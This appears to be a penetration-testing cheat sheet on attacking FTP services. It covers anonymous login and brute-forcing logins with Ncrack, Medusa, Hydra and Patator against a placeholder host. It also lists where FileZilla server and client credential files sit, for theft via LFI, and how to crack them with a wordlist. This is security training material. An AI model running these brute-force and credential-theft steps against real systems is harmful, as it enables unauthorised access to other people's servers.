---
title: PORT 21/tcp - FTP
category: Services
order: 1
---

# Introduction

FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP/IP (Transmission Control Protocol/Internet Protocol) network, aka the internet. Users, who have been granted access, can receive and transfer files in the File Transfer Protocol server (also known as FTP host/site).

# Anonymous User

In some devices anonymous user is enabled. It's important to give it a try.

```
ftp 10.10.10.10
name: anonymous
pass
```

# Bruteforcing Credentials

To bruteforce the login in order to find valid credentials we can use different tools:

* Ncrack
```
ncrack -U usernames.txt -P passowrds.txt ftp://10.10.10.10 -v
ncrack -u root -P passowrds.txt ftp://10.10.10.10 -v
```

* Medusa
```
medusa -h 10.10.10.10 -U usernames.txt -P passowrds.txt -M ftp
medusa -h 10.10.10.10 -u root -P passowrds.txt -M ftp
```

* Hydra
```
hydra -L usernames.txt -P passwords.txt ftp://10.10.10.10 -s 21
hydra -l root -P passwords.txt ftp://10.10.10.10 -s 21
```

* Patator
```
patator ftp_login host=10.10.10.10 user=FILE0 password=FILE1 0=usernames.txt 1=passwords.txt -x ignore:mesg='Login incorrect.'
patator ftp_login host=10.10.10.10 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Login incorrect.'
```

# FileZilla Server (From LFI)

## FileZilla Server credentials

FileZilla Server credentials are stored on the `FileZilla Server.xml` file stored in one of the following routes:

```
C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\xampp\FileZillaFTP\FileZilla Server.xml
```

Some times we can found it on plain text (base64) and sometimes encrypted. To decrypt we can use the following tool:

```
python filezilla-decrypt.py --wordlist /usr/share/wordlists/rockyou.txt
```

> **Note**: You need to modify **password** and **salt** variables of the python script and unescape the salt.

```
&amp; = &
&lt; = <
&apos; = '
&quot; = "
&gt; = >

# Example
Escaped:        `!U3`CQ;a&amp;3IzbXc/4Wpb\)OZ3TsXP;&apos;Wx#^K&quot;Tu_XX.K&apos;o&lt;&apos;c&amp;A:vItTX-M|Z0Y
Unescaped:      `!U3`CQ;a&3IzbXc/4Wpb\)OZ3TsXP;'Wx#^K"Tu_XX.K'o<'c&A:vItTX-M|Z0Y
```
* [https://github.com/l4rm4nd/FileZilla-Password-Decryptor](https://github.com/l4rm4nd/FileZilla-Password-Decryptor)

## FileZilla client credentials

FileZilla client save last saved credentials on the following link.

```
C:\Users\VICTIM\AppData\Roaming\FileZilla\RecentServers.xml
```
